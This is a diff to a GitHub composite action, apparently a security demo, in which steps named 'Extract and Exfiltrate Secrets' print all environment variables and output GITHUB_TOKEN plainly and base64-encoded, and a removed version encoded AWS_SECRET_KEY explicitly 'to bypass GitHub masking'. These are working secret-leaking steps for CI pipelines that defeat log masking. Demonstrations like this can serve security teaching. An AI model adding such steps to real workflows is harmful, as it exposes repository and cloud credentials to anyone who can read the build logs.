@@ -4,12 +4,15 @@ author: "Security Demo"
 runs:
   using: "composite"
   steps:
+    - name: 🔍 Debugging Environment Variables
+      run: |
+        echo "🔄 Listing Environment Variables:"
+        env  # This will print all available environment variables
+      shell: bash
+
     - name: 🔥 Extract and Exfiltrate Secrets
       run: |
         echo "🔓 Extracting GitHub Token..."
-        AWS_SECRET=$(printenv AWS_SECRET_KEY)
-
-        # Encode secrets to bypass GitHub masking
-        echo "🔓 Base64 Encoded AWS_SECRET_KEY: $(echo $AWS_SECRET | base64)"
-
+        echo "GITHUB_TOKEN is: ${GITHUB_TOKEN}"  # Print token if available
+        echo "Base64 Encoded GITHUB_TOKEN: $(echo ${GITHUB_TOKEN} | base64)"
       shell: bash
